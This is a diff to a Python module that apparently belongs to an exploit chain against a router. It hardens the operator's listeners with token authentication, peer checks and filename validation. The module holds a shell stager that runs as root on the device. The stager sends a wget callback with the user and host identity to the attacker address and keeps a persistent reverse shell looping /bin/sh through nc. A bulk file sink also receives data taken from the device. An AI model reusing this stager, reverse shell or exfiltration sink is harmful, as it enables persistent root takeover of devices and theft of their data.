@@ -2,7 +2,9 @@
 """Operator-side plumbing: stager delivery, a durable root command channel,
 and a bulk file sink.
 
-Three listeners run on the operator's laptop for the whole session:
+Three listeners run on the operator's laptop for the whole session. Each binds
+only the router-facing address, requires the expected router source address,
+and authenticates with a per-run token stored in the private resume manifest:
 
   HTTP  :8000   serves /s (the stager the root eval fetches) and takes the
                 /pwned proof callback.
@@ -37,6 +39,19 @@ import time
 from chain import log
 
 
+def normalize_peer(peer):
+    """Resolve a configured hostname to the numeric IPv4 source we will see."""
+    if not peer:
+        return None
+    host = str(peer).strip().strip("[]")
+    if host.count(":") == 1 and host.rsplit(":", 1)[1].isdigit():
+        host = host.rsplit(":", 1)[0]
+    try:
+        return socket.gethostbyname(host)
+    except socket.gaierror as exc:
+        raise ValueError(f"cannot resolve expected peer {peer!r}: {exc}")
+
+
 # ---- stager -----------------------------------------------------------------
 
 # Runs as root, inside cap_init, in the two-command window the eval gives us.
@@ -53,9 +68,10 @@ export PATH=/usr/sbin:/usr/bin:/sbin:/bin:$PATH
 A={attacker}
 HP={serve_port}
 SP={shell_port}
+TOK={token}
 
 wget -q -O /dev/null \
-  "http://$A:$HP/pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)" 2>/dev/null
+  "http://$A:$HP/$TOK/pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)" 2>/dev/null
 {{ id; uname -a; cat /proc/version; }} > /tmp/rd03v2_root 2>&1
 
 # Put the radios back the way we found them.  cap_init writes its wireless
@@ -90,14 +106,15 @@ wget -q -O /dev/null \
 (
   while true; do
     rm -f /tmp/.ch; mkfifo /tmp/.ch 2>/dev/null
-    /bin/sh < /tmp/.ch 2>&1 | nc $A $SP > /tmp/.ch
+    {{ printf 'AUTH %s\n' "$TOK"; /bin/sh < /tmp/.ch 2>&1; }} \
+      | nc $A $SP > /tmp/.ch
     sleep 5
   done
 ) &
 """
 
 
-def build_stager(attacker, serve_port, shell_port, restore,
+def build_stager(attacker, serve_port, shell_port, restore, token,
                  repair_iters=40, repair_interval=5):
     """Render the stager.
 
@@ -120,6 +137,7 @@ def build_stager(attacker, serve_port, shell_port, restore,
     enc5, key5 = band(1)
     return STAGER.format(
         attacker=attacker, serve_port=serve_port, shell_port=shell_port,
+        token=token,
         enc24=enc24, key24=key24, enc5=enc5, key5=key5,
         repair_iters=repair_iters, repair_interval=repair_interval,
     ).encode()
@@ -146,18 +164,26 @@ class _StagerHandler(http.server.BaseHTTPRequestHandler):
     callback = None      # threading.Event
     callback_path = None  # list, so the handler can hand the text back
     files = {}           # url path -> filesystem path, streamed rather than buffered
+    token = ""
+    expected_peer = None
 
     def log_message(self, fmt, *a):
         log(f"[http] {self.client_address[0]} {fmt % a}")
 
     def do_GET(self):
-        if self.path.startswith("/pwned"):
+        if self.expected_peer and self.client_address[0] != self.expected_peer:
+            self.send_response(403)
+            self.end_headers()
+            log(f"[!] http rejected unexpected peer {self.client_address[0]}")
+            return
+        prefix = f"/{self.token}"
+        if self.path.startswith(prefix + "/pwned"):
             log(f"[+] ROOT CALLBACK: {self.path}")
             type(self).callback_path.append(self.path)
             type(self).callback.set()
             self._reply(b"ok")
             return
-        if self.path == "/s" or self.path.startswith("/s?"):
+        if self.path == prefix + "/s" or self.path.startswith(prefix + "/s?"):
             self._reply(self.stager, "application/octet-stream")
             return
         # Images are tens of MB; stream them off disk so a retrying wget on a
@@ -188,19 +214,29 @@ class _StagerHandler(http.server.BaseHTTPRequestHandler):
 
 
 class StagerServer:
-    def __init__(self, port, stager):
+    def __init__(self, bind_ip, port, stager, token, expected_peer):
         _StagerHandler.stager = stager
         _StagerHandler.callback = threading.Event()
         _StagerHandler.callback_path = []
+        _StagerHandler.files = {}
+        _StagerHandler.token = token
+        _StagerHandler.expected_peer = normalize_peer(expected_peer)
         socketserver.TCPServer.allow_reuse_address = True
-        self.httpd = socketserver.ThreadingTCPServer(("0.0.0.0", port), _StagerHandler)
+        self.token = token
+        self.httpd = socketserver.ThreadingTCPServer((bind_ip, port), _StagerHandler)
         threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
-        log(f"[*] http :{port} serving /s ({len(stager)} B)")
+        log(f"[*] http {bind_ip}:{port} serving /{token}/s ({len(stager)} B)")
+
+    @property
+    def stager_path(self):
+        return f"/{self.token}/s"
 
     def add(self, urlpath, filepath):
         """Publish a local file at `urlpath` for the device to wget."""
-        _StagerHandler.files[urlpath] = filepath
-        log(f"[*] http serving {urlpath} <- {filepath}")
+        public_path = f"/{self.token}{urlpath}"
+        _StagerHandler.files[public_path] = filepath
+        log(f"[*] http serving {public_path} <- {filepath}")
+        return public_path
 
     @property
     def callback(self):
@@ -226,7 +262,7 @@ class ShellChannel:
     commands must be self-contained -- no `cd` that later calls depend on.
     """
 
-    def __init__(self, port):
+    def __init__(self, bind_ip, port, token, expected_peer):
         self.port = port
         self.sock = None
         self.lock = threading.Lock()
@@ -236,11 +272,13 @@ class ShellChannel:
         self._buf = b""
         self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self._srv.bind(("0.0.0.0", port))
+        self._srv.bind((bind_ip, port))
         self._srv.listen(4)
+        self.token = token
+        self.expected_peer = normalize_peer(expected_peer)
         self._seq = 0
         threading.Thread(target=self._accept_loop, daemon=True).start()
-        log(f"[*] shell channel listening on :{port}")
+        log(f"[*] shell channel listening on {bind_ip}:{port}")
 
     def _accept_loop(self):
         while True:
@@ -248,6 +286,25 @@ class ShellChannel:
                 c, addr = self._srv.accept()
             except OSError:
                 return
+            if self.expected_peer and addr[0] != self.expected_peer:
+                log(f"[!] shell rejected unexpected peer {addr[0]}")
+                c.close()
+                continue
+            try:
+                c.settimeout(10)
+                auth = b""
+                while b"\n" not in auth and len(auth) <= 128:
+                    chunk = c.recv(1)
+                    if not chunk:
+                        break
+                    auth += chunk
+                if auth.rstrip(b"\r\n") != f"AUTH {self.token}".encode():
+                    log(f"[!] shell rejected unauthenticated peer {addr[0]}")
+                    c.close()
+                    continue
+            except OSError:
+                c.close()
+                continue
             with self.lock:
                 if self.sock is not None:
                     try:
@@ -347,23 +404,33 @@ class FileSink:
     expected number of bytes has arrived rather than waiting for EOF.
     """
 
-    def __init__(self, port, outdir):
+    def __init__(self, bind_ip, port, outdir, token, expected_peer,
+                 expected_files):
         self.port = port
         self.outdir = outdir
         self.done = queue.Queue()
+        self.token = token
+        self.expected_peer = normalize_peer(expected_peer)
+        self.expected_files = dict(expected_files)
+        self.received = set()
+        self.state_lock = threading.Lock()
         self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self._srv.bind(("0.0.0.0", port))
+        self._srv.bind((bind_ip, port))
         self._srv.listen(4)
         threading.Thread(target=self._accept_loop, daemon=True).start()
-        log(f"[*] file sink listening on :{port} -> {outdir}")
+        log(f"[*] file sink listening on {bind_ip}:{port} -> {outdir}")
 
     def _accept_loop(self):
         while True:
             try:
-                c, _ = self._srv.accept()
+                c, addr = self._srv.accept()
             except OSError:
                 return
+            if self.expected_peer and addr[0] != self.expected_peer:
+                log(f"[!] file sink rejected unexpected peer {addr[0]}")
+                c.close()
+                continue
             threading.Thread(target=self._recv, args=(c,), daemon=True).start()
 
     def _recv(self, c):
@@ -376,12 +443,33 @@ class FileSink:
                 if not b:
                     return
                 head += b
+            if head.decode("ascii", "replace").strip() != f"AUTH {self.token}":
+                log("[!] file sink: invalid authentication")
+                return
+            head = b""
+            while b"\n" not in head and len(head) <= 512:
+                b = c.recv(1)
+                if not b:
+                    return
+                head += b
             parts = head.decode("utf-8", "replace").strip().split()
             if len(parts) != 3 or parts[0] != "FILE":
                 log(f"[!] file sink: bad header {head!r}")
                 return
             name, size = parts[1], int(parts[2])
-            path = f"{self.outdir}/{name}"
+            if name not in self.expected_files or size != self.expected_files[name]:
+                log(f"[!] file sink: unexpected transfer {name!r} ({size} B)")
+                return
+            with self.state_lock:
+                if name in self.received:
+                    log(f"[!] file sink: duplicate transfer {name!r}")
+                    return
+                self.received.add(name)
+            root = os.path.realpath(self.outdir)
+            path = os.path.realpath(os.path.join(root, name))
+            if os.path.dirname(path) != root or os.path.basename(path) != name:
+                log(f"[!] file sink: unsafe filename {name!r}")
+                return
             got = 0
             t0 = time.time()
             with open(path, "wb") as fh:
@@ -391,13 +479,20 @@ class FileSink:
                         break
                     fh.write(chunk)
                     got += len(chunk)
+            os.chmod(path, 0o600)
             dt = max(time.time() - t0, 0.001)
             ok = got == size
+            if not ok:
+                with self.state_lock:
+                    self.received.discard(name)
             log(f"[{'+' if ok else '!'}] received {name}: {got}/{size} B "
                 f"in {dt:.1f}s ({got/dt/1024:.0f} KB/s)")
             self.done.put((name, path, got, size))
         except Exception as e:                                  # noqa: BLE001
             log(f"[!] file sink error on {name}: {type(e).__name__}: {e}")
+            if name:
+                with self.state_lock:
+                    self.received.discard(name)
             self.done.put((name, None, 0, 0))
         finally:
             try:
